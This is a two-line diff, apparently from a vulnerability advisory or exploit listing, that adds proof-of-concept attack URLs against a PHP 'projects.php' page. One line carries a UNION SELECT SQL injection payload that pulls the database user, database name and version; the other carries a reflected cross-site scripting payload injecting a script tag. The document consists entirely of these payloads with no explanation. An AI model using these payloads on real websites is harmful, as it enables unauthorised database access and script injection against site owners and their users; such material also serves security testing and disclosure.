@@ -1,0 +1,2 @@
+http://www.example.com/[path]/projects.php?id=1+union+select+0,1,concat_ws(user(),0x3a,database(),0x3a,version()),3,4,5,6--
+http://www.example.com/[path]/projects.php?show=&lt;script&gt;alert(1)&lt;/script&gt;
